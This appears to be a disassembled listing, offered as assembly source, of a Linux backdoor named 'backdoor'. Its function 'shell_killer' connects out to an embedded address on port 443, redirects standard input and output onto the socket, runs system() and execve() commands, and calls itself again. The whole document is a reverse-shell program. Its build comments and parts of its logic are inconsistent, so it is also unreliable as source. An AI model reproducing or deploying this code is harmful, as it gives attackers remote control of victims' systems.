;nasm -f backdoor.asm
;gcc -o backdoor -m elf_i386 

dup2@plt-0x10:
 push QWORD PTR [rip+0x200afa] # 6011e0 <_GLOBAL_OFFSET_TABLE_+0x8>
 jmp QWORD PTR [rip+0x200afc] # 6011e8 <_GLOBAL_OFFSET_TABLE_+0x10>
 nop DWORD PTR [rax+0x0]
dup2@plt:
 jmp QWORD PTR [rip+0x200afa] # 6011f0 <_GLOBAL_OFFSET_TABLE_+0x18>
 push 0x0
 jmp 4006e0 <.debug_info_seg+0x4006e0>
memset@plt:
 jmp QWORD PTR [rip+0x200af2] # 6011f8 <_GLOBAL_OFFSET_TABLE_+0x20>
 push 0x1
 jmp 4006e0 <.debug_info_seg+0x4006e0>
htons@plt:
 jmp QWORD PTR [rip+0x200aea] # 601200 <_GLOBAL_OFFSET_TABLE_+0x28>
 push 0x2
 jmp 4006e0 <.debug_info_seg+0x4006e0>
system@plt:
 jmp QWORD PTR [rip+0x200ae2] # 601208 <_GLOBAL_OFFSET_TABLE_+0x30>
 push 0x3
 jmp 4006e0 <.debug_info_seg+0x4006e0>
setsockopt@plt:
 jmp QWORD PTR [rip+0x200ada] # 601210 <_GLOBAL_OFFSET_TABLE_+0x38>
 push 0x4
 jmp 4006e0 <.debug_info_seg+0x4006e0>
sleep@plt:
 jmp QWORD PTR [rip+0x200ad2] # 601218 <_GLOBAL_OFFSET_TABLE_+0x40>
 push 0x5
 jmp 4006e0 <.debug_info_seg+0x4006e0>
connect@plt:
 jmp QWORD PTR [rip+0x200aca] # 601220 <_GLOBAL_OFFSET_TABLE_+0x48>
 push 0x6
 jmp 4006e0 <.debug_info_seg+0x4006e0>
execve@plt:
 jmp QWORD PTR [rip+0x200ac2] # 601228 <_GLOBAL_OFFSET_TABLE_+0x50>
 push 0x7
 jmp 4006e0 <.debug_info_seg+0x4006e0>
socket@plt:
 jmp QWORD PTR [rip+0x200aba] # 601230 <_GLOBAL_OFFSET_TABLE_+0x58>
 push 0x8
 jmp 4006e0 <.debug_info_seg+0x4006e0>
send@plt:
 jmp QWORD PTR [rip+0x200ab2] # 601238 <_GLOBAL_OFFSET_TABLE_+0x60>
 push 0x9
 jmp 4006e0 <.debug_info_seg+0x4006e0>
perror@plt:
 jmp QWORD PTR [rip+0x200aaa] # 601240 <_GLOBAL_OFFSET_TABLE_+0x68>
 push 0xa
 jmp 4006e0 <.debug_info_seg+0x4006e0>
inet_addr@plt:
 jmp QWORD PTR [rip+0x200a9a] # 601250 <_GLOBAL_OFFSET_TABLE_+0x78>
 push 0xc
 jmp 4006e0 <.debug_info_seg+0x4006e0>
_Z12shell_killerv:
 push rbp
 mov rbp,rsp
 sub rsp,0xa0
 mov QWORD PTR [rbp-0x8],rbx
 lea rax,[rbp-0x94]
 mov edx,0x0
 mov ecx,0x8
 mov rdi,rax
 mov esi,edx
 mov rdx,rcx
 call 400700 <memset@plt>
 mov QWORD PTR [rbp-0x48],rax
 mov WORD PTR [rbp-0x9c],0x2
 mov eax,0x400bbc
 mov rdi,rax
 call 4007b0 <inet_addr@plt>
 mov DWORD PTR [rbp-0x8c],eax
 mov eax,DWORD PTR [rbp-0x8c]
 mov DWORD PTR [rbp-0x98],eax
 mov eax,0x1bb
 mov edi,eax
 call 400710 <htons@plt>
 mov WORD PTR [rbp-0xa0],ax
 movzx eax,WORD PTR [rbp-0xa0]
 mov WORD PTR [rbp-0x9a],ax
 mov eax,0x2
 mov edx,0x1
 mov ecx,0x0
 mov edi,eax
 mov esi,edx
 mov edx,ecx
 call 400770 <socket@plt>
 mov DWORD PTR [rbp-0x88],eax
 mov eax,DWORD PTR [rbp-0x88]
 mov DWORD PTR [rbp-0x84],eax
 mov eax,DWORD PTR [rbp-0x84]
 lea rdx,[rbp-0x9c]
 mov ecx,0x10
 mov edi,eax
 mov rsi,rdx
 mov edx,ecx
 call 400750 <connect@plt>
 mov DWORD PTR [rbp-0x80],eax
 mov eax,0x400750
 test rax,rax
 jne 400966 <_Z12shell_killerv+0xde>
 mov eax,0x400bc8
 mov rdi,rax
 call 400790 <perror@plt>
 mov DWORD PTR [rbp-0x7c],0x1
 mov eax,DWORD PTR [rbp-0x84]
 mov edx,0x1
 mov ecx,0x2
 lea rbx,[rbp-0x7c]
 mov esi,0x4
 mov edi,eax
 mov DWORD PTR [rbp-0x10],esi
 mov esi,edx
 mov edx,ecx
 mov rcx,rbx
 mov eax,DWORD PTR [rbp-0x10]
 mov r8d,eax
 call 400730 <setsockopt@plt>
 mov DWORD PTR [rbp-0x78],eax
 mov eax,DWORD PTR [rbp-0x78]
 test eax,eax
 jge 4009b4 <_Z12shell_killerv+0x12c>
 mov eax,0x400bf4
 mov rdi,rax
 call 400790 <perror@plt>
 mov eax,DWORD PTR [rbp-0x84]
 mov edx,0x0
 mov edi,eax
 mov esi,edx
 call 4006f0 <dup2@plt>
 mov DWORD PTR [rbp-0x74],eax
 mov eax,DWORD PTR [rbp-0x84]
 mov edx,0x1
 mov edi,eax
 mov esi,edx
 call 4006f0 <dup2@plt>
 mov DWORD PTR [rbp-0x70],eax
 mov eax,DWORD PTR [rbp-0x84]
 mov edx,0x2
 mov edi,eax
 mov esi,edx
 call 4006f0 <dup2@plt>
 mov DWORD PTR [rbp-0x6c],eax
 mov eax,0x400c14
 mov rdi,rax
 call 400720 <system@plt>
 mov DWORD PTR [rbp-0x68],eax
 mov eax,DWORD PTR [rbp-0x68]
 mov DWORD PTR [rbp-0x64],eax
 mov eax,0x400c30
 mov rdi,rax
 call 400720 <system@plt>
 mov DWORD PTR [rbp-0x60],eax
 mov eax,DWORD PTR [rbp-0x84]
 mov edx,0x400c4c
 mov ecx,0x20
 mov ebx,0x0
 mov edi,eax
 mov rsi,rdx
 mov rdx,rcx
 mov ecx,ebx
 call 400780 <send@plt>
 mov QWORD PTR [rbp-0x40],rax
 mov eax,DWORD PTR [rbp-0x84]
 mov edx,0x400c70
 mov ecx,0x1f
 mov ebx,0x0
 mov edi,eax
 mov rsi,rdx
 mov rdx,rcx
 mov ecx,ebx
 call 400780 <send@plt>
 mov QWORD PTR [rbp-0x38],rax
 mov eax,DWORD PTR [rbp-0x84]
 mov edx,0x400c94
 mov ecx,0x1b
 mov ebx,0x0
 mov edi,eax
 mov rsi,rdx
 mov rdx,rcx
 mov ecx,ebx
 call 400780 <send@plt>
 mov QWORD PTR [rbp-0x30],rax
 mov eax,DWORD PTR [rbp-0x84]
 mov edx,0x400cb4
 mov ecx,0x26
 mov ebx,0x0
 mov edi,eax
 mov rsi,rdx
 mov rdx,rcx
 mov ecx,ebx
 call 400780 <send@plt>
 mov QWORD PTR [rbp-0x28],rax
 mov eax,DWORD PTR [rbp-0x84]
 mov edx,0x400cdc
 mov ecx,0x18
 mov ebx,0x0
 mov edi,eax
 mov rsi,rdx
 mov rdx,rcx
 mov ecx,ebx
 call 400780 <send@plt>
 mov QWORD PTR [rbp-0x20],rax
 mov eax,0x5
 mov edi,eax
 call 400740 <sleep@plt>
 mov DWORD PTR [rbp-0x5c],eax
 mov eax,DWORD PTR [rbp-0x84]
 mov edx,0x400cf4
 mov ecx,0xa
 mov ebx,0x0
 mov edi,eax
 mov rsi,rdx
 mov rdx,rcx
 mov ecx,ebx
 call 400780 <send@plt>
 mov QWORD PTR [rbp-0x18],rax
 mov eax,0x400d04
 mov edx,0x0
 mov ecx,0x0
 mov rdi,rax
 mov rsi,rdx
 mov rdx,rcx
 call 400760 <execve@plt>
 mov DWORD PTR [rbp-0x58],eax
 mov eax,DWORD PTR [rbp-0x58]
 mov DWORD PTR [rbp-0x64],eax
 mov eax,0x400d0c
 mov edx,0x0
 mov ecx,0x0
 mov rdi,rax
 mov rsi,rdx
 mov rdx,rcx
 call 400760 <execve@plt>
 mov DWORD PTR [rbp-0x54],eax
 mov eax,0x400d2c
 mov edx,0x0
 mov ecx,0x0
 mov rdi,rax
 mov rsi,rdx
 mov rdx,rcx
 call 400760 <execve@plt>
 mov DWORD PTR [rbp-0x50],eax
 call 400888 <_Z12shell_killerv>
 mov rbx,QWORD PTR [rbp-0x8]
 leave 
 ret 
main:
 push rbp
 mov rbp,rsp
 sub rsp,0x20
 mov DWORD PTR [rbp-0x18],edi
 mov QWORD PTR [rbp-0x10],rsi
 mov BYTE PTR [rbp-0x20],0x73
 movsx eax,BYTE PTR [rbp-0x20]
 movsx rax,al
 cmp eax,0x73
 jne 400bb4 <main+0x25>
 call 400888 <_Z12shell_killerv>
 mov eax,0x0
 leave 
 ret 
 nop
